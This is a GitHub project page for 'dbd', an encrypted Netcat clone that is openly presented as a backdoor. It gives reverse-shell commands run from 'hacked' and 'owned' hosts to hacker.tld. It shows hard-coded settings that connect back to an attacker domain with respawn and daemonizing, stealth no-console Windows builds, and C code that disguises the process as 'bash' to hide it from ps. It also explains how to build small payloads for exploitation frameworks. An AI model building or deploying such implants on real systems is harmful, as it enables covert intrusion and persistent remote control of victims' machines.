<!DOCTYPE html>
<html>

  <head>
    <meta charset='utf-8' />
    <meta http-equiv="X-UA-Compatible" content="chrome=1" />
    <meta name="description" content="Dbd : Durandal's Backdoor" />

    <link rel="stylesheet" type="text/css" media="screen" href="stylesheets/stylesheet.css">

    <title>Dbd</title>
  </head>

  <body>

    <!-- HEADER -->
    <div id="header_wrap" class="outer">
        <header class="inner">
          <a id="forkme_banner" href="https://github.com/gitdurandal/dbd">View on GitHub</a>

          <h1 id="project_title">Dbd</h1>
          <h2 id="project_tagline">Durandal's Backdoor</h2>

            <section id="downloads">
              <a class="zip_download_link" href="https://github.com/gitdurandal/dbd/zipball/master">Download this project as a .zip file</a>
              <a class="tar_download_link" href="https://github.com/gitdurandal/dbd/tarball/master">Download this project as a tar.gz file</a>
            </section>
        </header>
    </div>

    <!-- MAIN CONTENT -->
    <div id="main_content_wrap" class="outer">
      <section id="main_content" class="inner">
        <pre><code>  d8888b. d8888b. d8888b.
  88  `8D 88  `8D 88  `8D
  88   88 88oooY' 88   88
  88   88 88~~~b. 88   88
  88  .8D 88   8D 88  .8D
  Y8888D' Y8888P' Y8888D'
</code></pre>

<h1>
<a name="durandals-backdoor" class="anchor" href="#durandals-backdoor"><span class="octicon octicon-link"></span></a><a href="http://gitbrew.org/dbd">Durandal's Backdoor</a>
</h1>

<h1>
<a name="copyright-c-2013-kyle-barnthouse-kbarnthousehephaestusseccom" class="anchor" href="#copyright-c-2013-kyle-barnthouse-kbarnthousehephaestusseccom"><span class="octicon octicon-link"></span></a>Copyright (C) 2013 Kyle Barnthouse <a href="mailto:kbarnthouse@hephaestussec.com"></a><a href="mailto:kbarnthouse@hephaestussec.com">kbarnthouse@hephaestussec.com</a>
</h1>

<h1>
<a name="dbd-is-distributed-under-the-gnu-gpl" class="anchor" href="#dbd-is-distributed-under-the-gnu-gpl"><span class="octicon octicon-link"></span></a>dbd is distributed under the GNU GPL</h1>

<h3>
<a name="synopsis" class="anchor" href="#synopsis"><span class="octicon octicon-link"></span></a>SYNOPSIS</h3>

<p>dbd is a Netcat-clone, designed to be portable and offer strong encryption. It runs on Unix-like operating systems and on Microsoft Win32. dbd features AES-CBC-128 + HMAC-SHA1 encryption (by Christophe Devine), program execution (-e option), choosing source port, continuous reconnection with delay, and some other nice features. dbd supports TCP/IP communication only. Source code and binaries are distributed under the GNU General Public License.</p>

<h3>
<a name="compilation" class="anchor" href="#compilation"><span class="octicon octicon-link"></span></a>COMPILATION</h3>

<pre><code>$ make
usage:
  make unix     - Linux, NetBSD, FreeBSD, OpenBSD
  make unix32  - Linux, NetBSD, FreeBSD, OpenBSD 32-bit
  make sunos    - SunOS (Solaris)
  make win32    - native win32 console app (w/ Cygwin + MinGW)
  make win32bg  - create a native win32 no-console app (w/ Cygwin + MinGW)
  make win32bg CFLAGS=-DSTEALTH - stealthy no-console app
  make mingw    - native win32 console app (w/ MinGW MSYS)
  make mingwbg  - native win32 no-console app (w/ MinGW MSYS)
  make mingwbg CFLAGS=-DSTEALTH - stealthy no-console app (w/ MinGW MSYS)
  make cygwin   - Cygwin console app
  make darwin   - Darwin

cross-compile options:
  make mingw-cross    - win32 cross compile (i586-mingw32msvc-gcc)
  make mingwbg-cross  - win32 no-console cross compile (i586-mingw32msvc-gcc)
  make mingwbg-cross CFLAGS=-DSTEALTH - stealthy win32 cross compile
  make unix CROSS_COMPILE=&lt;path/to/toolchain-&gt; - cross compile for any arch

roll up a tarball (move your compiled stuff to binaries/ first:
  make dist     - create tarball with source files, readme, and binaries/
</code></pre>

<p>To compile dbd under a Unix-like operating system you need gcc and relevant development tools. For Linux, FreeBSD, NetBSD, OpenBSD (and possibly others), type:</p>

<pre><code>$ make unix
</code></pre>

<p>For SunOS/Solaris, type:</p>

<pre><code>$ make sunos
</code></pre>

<p>To compile dbd under Microsoft Windows (NT/2K/XP/2K3) you need MinGW+MSYS, or Cygwin with full development support (Cygwin's MinGW gcc). To compile a native Win32 dbd console application under Cygwin, type:</p>

<pre><code>$ make win32
</code></pre>

<p>or, under MSYS:</p>

<pre><code>$ make mingw
</code></pre>

<p>To compile a no-console ("WinMain") application under Cygwin, type:</p>

<pre><code>$ make win32bg
</code></pre>

<p>or, under MSYS:</p>

<pre><code>$ make mingwbg
</code></pre>

<p>To compile a Cygwin-specific console application, type:</p>

<pre><code>$make cygwin
</code></pre>

<p>You may want to change the default behaviour of dbd. One of the most important thing is to change the default shared secret to your own pass phrase. Edit dbd.h and replace with your preferences. You may, for example, want to hardcode a host + port to connect to if dbd is started without options. Complete examples are provided in dbd.h.</p>

<h3>
<a name="sample-uses" class="anchor" href="#sample-uses"><span class="octicon octicon-link"></span></a>SAMPLE USES</h3>

<p>With a little imagination, dbd can be used for many things:</p>

<p>Use dbd to securely transfer files between two networks:</p>

<pre><code>snafu$ dbd -l -p 12345 -k secret &gt; output.file

fubar$ cat input.file | dbd -k secret snafu 12345
</code></pre>

<p>or from win32:</p>

<pre><code>C:\somedir&gt;type input.fil | dbd -k secret snafu 12345
</code></pre>

<p>Use dbd as a simple (but secure) chat:</p>

<pre><code>snafu$ dbd -P snafu -Hon fubar 1234

fubar$ dbd -Pfubar -Hon -l -p 1234
</code></pre>

<p>Use dbd as a pen-test backdoor:</p>

<pre><code>C:\hacked box&gt;dbdbg.exe -r1800 -q -e cmd.exe hacker.tld 443
</code></pre>

<p>or under Unix-like OSes:</p>

<pre><code>root@owned# ./dbd -r1800 -Don -e /bin/bash hacker.tld 993
</code></pre>

<h3>
<a name="hard-coding-options" class="anchor" href="#hard-coding-options"><span class="octicon octicon-link"></span></a>HARD CODING OPTIONS</h3>

<p>In addition to using command line options, you can hard code variables by using #defines in dbd.h. To do this, set the variables you wish to use as named constants and compile as normal. For example, if you wanted to hard code a dbd executable that connected back to "evil.nationalbankofuganda.com" on port 995, and executed "/bin/bash" you could run:</p>

<pre><code>root@owned# ./dbd -e /bin/bash evil.nationalbankofuganda.com 995
</code></pre>

<p>or using hard-coded #defines, you could edit dbd.h:</p>

<div class="highlight"><pre><span class="cp">#define DOLISTEN 0</span>
<span class="cp">#define HOST "evil.nationalbankofuganda.com"</span>
<span class="cp">#define PORT 995</span>
<span class="cp">#define EXECPROG "/bin/bash"</span>
</pre></div>

<pre><code>You can also set respawn and stealth options to help maintain your connection:
</code></pre>

<div class="highlight"><pre><span class="cp">#define RESPAWN_ENABLED 1</span>
<span class="cp">#define RESPAWN_INTERVAL 900</span>
<span class="cp">#define QUIET 1</span>
<span class="cp">#define DAEMONIZE 1</span>
</pre></div>

<p>This will set the connection to daemonize ("melt" in malware terms), never send output to STDOUT, and attempt to respawn the connection every 15 minutes should it ever disconnect from the listener.</p>

<h3>
<a name="romulan-cloaking-technology" class="anchor" href="#romulan-cloaking-technology"><span class="octicon octicon-link"></span></a>ROMULAN CLOAKING TECHNOLOGY</h3>

<p>Now we're getting into the fun stuff. Once you are a mastar at hard-coding options into your backdoor, you can use what is quite possibly the most fun named constant at our disposal: CLOAK. To do this, simply set the value:</p>

<div class="highlight"><pre><span class="cp">#define CLOAK 1</span>
</pre></div>

<p>NOTE: this currently only works on *nix compiles. Eventually I plan on adding Win32 process migration/hooking so those targets can feel some Romulan love as well.</p>

<p>For *nix environments, this option scrubs argv[0] and replaces it with the string "bash\0". It also scrubs all other argv[]'s (it'd look silly if ps returned "bash -e /bin/bash someremotehost.com 443" now wouldn't it?) I hope it goes without saying that you CANNOT USE THIS OPTION UNLESS YOU ARE HARD CODING YOUR VARIABLES INTO DBD.H. Also, if you're testing this on your own system it's gonna be fun picking the right pid to kill. ;)</p>

<p>Feel free to use this scrubber in anything you happen to be working on:</p>

<div class="highlight"><pre><span class="c1">//grab our named constant</span>
<span class="kt">int</span> <span class="n">cloak</span> <span class="o">=</span> <span class="n">CLOAK</span><span class="p">;</span>

<span class="c1">//Engage cloaking device</span>
<span class="k">if</span><span class="p">(</span><span class="n">cloak</span><span class="p">)</span>
<span class="p">{</span>
    <span class="err">#</span><span class="n">ifdef</span> <span class="n">WIN32</span>
    <span class="c1">//stub              </span>
    <span class="err">#</span><span class="k">else</span>
    <span class="c1">//change argv[0] to say bash       </span>
    <span class="kt">int</span> <span class="n">scrub</span><span class="p">;</span>
    <span class="n">strncpy</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="s">"</span><span class="se">\0</span><span class="s">"</span><span class="p">,</span> <span class="n">strlen</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>
    <span class="n">strcpy</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="s">"bash</span><span class="se">\0</span><span class="s">"</span><span class="p">);</span>    
    <span class="k">for</span> <span class="p">(</span><span class="n">scrub</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span> <span class="n">scrub</span> <span class="o">&lt;</span> <span class="n">argc</span><span class="p">;</span> <span class="n">scrub</span><span class="o">++</span><span class="p">)</span>
    <span class="p">{</span>                     
         <span class="n">strncpy</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">argv</span><span class="p">[</span><span class="n">scrub</span><span class="p">],</span> <span class="s">"</span><span class="se">\0</span><span class="s">"</span><span class="p">,</span> <span class="n">strlen</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">argv</span><span class="p">[</span><span class="n">scrub</span><span class="p">])</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>
    <span class="p">}</span>                 
    <span class="err">#</span><span class="n">endif</span>
<span class="p">}</span>
</pre></div>

<h3>
<a name="warning" class="anchor" href="#warning"><span class="octicon octicon-link"></span></a>WARNING</h3>

<p>Do not pass cached input (a file with commands or similar) to a listening "dbd -e" session. "dbd -e" is using pipes to pass data between the program being executed and dbd. Pipes are used (instead of plain pass-through duplicate file descriptors) because of encryption between the pipes and the socket. In order to prevent the writing end of one of the pipes from blocking the whole process, I turned it into a non-blocking descriptor. There is a chance that when passing too much input at a time through to the -e program, it will be truncated (cut off) since the pipe buffer (in the OS) can't hold all of the data. This problem can be solved by making dbd multi-threaded for instance, but I'll avoid this as long as possible for compatibility reasons.</p>

<h2>
<a name="cross-compiling" class="anchor" href="#cross-compiling"><span class="octicon octicon-link"></span></a>CROSS-COMPILING</h2>

<p>Since dbd was designed to interoperate with other tools/frameworks, make now allows win32 cross compiling on Linux systems that have the mingw32-gcc toolchain.  These options are almost identical to their Windows-native counterpart with the addition of "-cross" after the chosen build.  Example:</p>

<pre><code>$ make mingw-cross
</code></pre>

<p>will do the same thing on a Linux system that</p>

<pre><code>$ make mingw
</code></pre>

<p>would do on a win32 system with mingw/msys installed on it.</p>

<p>Right now all cross-compile options are built with Kali Linux in mind, but should work on any *nix with a little love.  If you have mingw32-gcc installed and make won't build, edit the WCC variable at the top of the Makefile and put the path to your mingw32-gcc binary.  </p>

<p>As of dbd-1.5 you can use any crossbuild toolchain to compile dbd by setting the toolchain prefix as CROSS_COMPILE.  For example, building an arm version is as easy as:</p>

<pre><code>$ make unix CROSS_COMPILE=arm-linux-gnueabi-
</code></pre>

<h2>
<a name="advanced-wizardry" class="anchor" href="#advanced-wizardry"><span class="octicon octicon-link"></span></a>ADVANCED WIZARDRY</h2>

<p>If you wish to integrate dbd with an exploitation framework, you can write a module that generates a custom dbd.h with configuration options specific to your target.  Anything not explicitly #defined in this file will still use the defaults so you don't have to write everything in the header.  Example: have a file rm dbd.h and replace with:</p>

<div class="highlight"><pre><span class="cp">#define DOLISTEN 0</span>
<span class="cp">#define HOST "evil.nationalbankofuganda.com"</span>
<span class="cp">#define PORT 995</span>
<span class="cp">#define EXECPROG "/bin/bash"</span>
<span class="cp">#define RESPAWN_ENABLED 1</span>
<span class="cp">#define RESPAWN_INTERVAL 900</span>
<span class="cp">#define QUIET 1</span>
<span class="cp">#define CLOAK 1</span>
<span class="cp">#define SHARED_SECRET "customcrypto"</span>
</pre></div>

<p>then call make  to build an auto connecting payload with cloaking and respawning that connects back to a listening dbd agent on evil.nationalbankofuganda.com running with the options:</p>

<pre><code>$ dbd -l -p 995 -k customcrypto
</code></pre>

<p>Another advanced trick is to compile dbd using dietlibc or uClibc.  to compile a dietlibc linux dbd agent, use:</p>

<pre><code>$ make unix CROSS_COMPILE="diet -Os "
</code></pre>

<p>Pay attention to the space after the s in the string.  This allows the Makefile to add gcc with the standard CFLAGS and LDFLAGS so your agent builds properly.  The advantage of using dietlibc is that it produces a very tiny 100% static executable for the target environment (around 70K for a linux dbd agent before packing as opposed to the standard 700K+ with glibc and gcc -static).  Using uClibc is even easier, since you just set the crossbuild prefix for your toolchain under CROSS_COMPILE.</p>

<h2>
<a name="license" class="anchor" href="#license"><span class="octicon octicon-link"></span></a>LICENSE</h2>

<p>dbd Copyright (C) 2013 Kyle Barnthouse <a href="mailto:kbarnthouse@hephaestussec.com">kbarnthouse@hephaestussec.com</a></p>

<p>This program is free software; you can redistribute it and/or modify it under the terms of the GNU General Public License as published by the Free Software Foundation; either version 2 of the License, or (at your option) any later version.</p>

<p>This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU General Public License for more details.</p>

<p>You should have received a copy of the GNU General Public License along with this program; if not, write to the Free Software Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307 USA</p>

<h2>
<a name="see-the-copying-file-for-more-information" class="anchor" href="#see-the-copying-file-for-more-information"><span class="octicon octicon-link"></span></a>See the COPYING file for more information.</h2>

<p>dbd's AES-CBC-128 + HMAC-SHA1 implementation is Copyright (C) Christophe Devine <a href="mailto:devine@cr0.net">devine@cr0.net</a> and is distributed under the GNU General Public License (GPL).</p>

<p>Some code (for doexec_win32.h) has been derived from doexec.c from the Win32 port of Netcat (C) Weld Pond and hobbit. Parts of doexec.c is Copyright (C) 1994 Nathaniel W. Mishkin (doexec.c code was originally derived from rlogind.exe).</p>

<p>The original version of Netcat was written by hobbit hobbit@avian.org. The NT version was done by Weld Pond <a href="mailto:weld@l0pht.com">weld@l0pht.com</a>.</p>

<hr><p>(C) Kyle Barnthouse <a href="mailto:kbarnthouse@hephaestussec.com"></a><a href="mailto:kbarnthouse@hephaestussec.com">kbarnthouse@hephaestussec.com</a>
Security Consultant<br><a href="https://gitbrew.org">gitbrew.org</a><br><a href="http://hephaestussec.com">Hephaestus Security</a></p>
      </section>
    </div>

    <!-- FOOTER  -->
    <div id="footer_wrap" class="outer">
      <footer class="inner">
        <p class="copyright">Dbd maintained by <a href="https://github.com/gitdurandal">gitdurandal</a></p>
        <p>Published with <a href="http://pages.github.com">GitHub Pages</a></p>
      </footer>
    </div>

    

  </body>
</html>
